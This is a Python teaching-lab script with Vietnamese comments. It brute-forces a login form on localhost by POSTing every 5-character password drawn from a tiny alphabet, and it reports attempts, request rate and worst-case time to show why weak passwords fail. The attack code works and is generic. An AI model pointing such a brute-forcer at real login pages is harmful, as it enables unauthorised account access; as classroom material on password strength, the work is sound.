"""CHỈ DÙNG CHO LAB: dò keyspace mật khẩu cố tình rất nhỏ trên localhost."""

import itertools
import time
import urllib.parse
import urllib.request
import urllib.error

URL = "http://localhost/BMUDW/authentication_2/login.php"
USERNAME = "student"
ALPHABET = "abcde12345"

PASSWORD_LENGTH = 5

TOTAL_SPACE = len(ALPHABET) ** PASSWORD_LENGTH

print("=== LAB 1: DÒ MẬT KHẨU YẾU TRÊN LOCALHOST ===")
print(f"Tài khoản           : {USERNAME}")
print(f"Tập ký tự           : {ALPHABET}")
print(f"Độ dài mật khẩu     : {PASSWORD_LENGTH}")
print(f"Không gian tìm kiếm : {len(ALPHABET)}^{PASSWORD_LENGTH} = {TOTAL_SPACE:,} khả năng")
print()

start = time.perf_counter()
attempts = 0

for attempts, chars in enumerate(itertools.product(ALPHABET, repeat=PASSWORD_LENGTH), start=1):
    password = "".join(chars)
    payload = urllib.parse.urlencode({"username": USERNAME, "password": password}).encode()
    request = urllib.request.Request(URL, data=payload, method="POST")

    try:
        with urllib.request.urlopen(request, timeout=3) as response:
            body = response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as error:
        body = error.read().decode("utf-8", errors="replace")

    # Chỉ in định kỳ để I/O console không làm sai lệch phép đo quá nhiều.
    if attempts == 1 or attempts % 250 == 0:
        elapsed = time.perf_counter() - start
        rps = attempts / elapsed if elapsed else 0
        print(
            f"Đã thử {attempts:4d}/{TOTAL_SPACE} | "
            f"đang thử={password} | "
            f"tốc độ={rps:8.1f} request/giây"
        )

    if "Login successful" in body:
        elapsed = time.perf_counter() - start
        avg_rate = attempts / elapsed if elapsed else 0
        avg_ms = (elapsed / attempts) * 1000 if attempts else 0
        worst_case = TOTAL_SPACE / avg_rate if avg_rate else 0

        print("\n=== KẾT QUẢ ===")
        print(f"Mật khẩu tìm được        : {password}")
        print(f"Số lần thử               : {attempts:,}")
        print(f"Thời gian thực tế        : {elapsed:.3f} giây")
        print(f"Tốc độ trung bình        : {avg_rate:,.1f} request/giây")
        print(f"Chi phí trung bình/request: {avg_ms:.3f} ms")
        print(f"Ước tính trường hợp xấu nhất ({TOTAL_SPACE:,} lần): {worst_case:.3f} giây")
        break
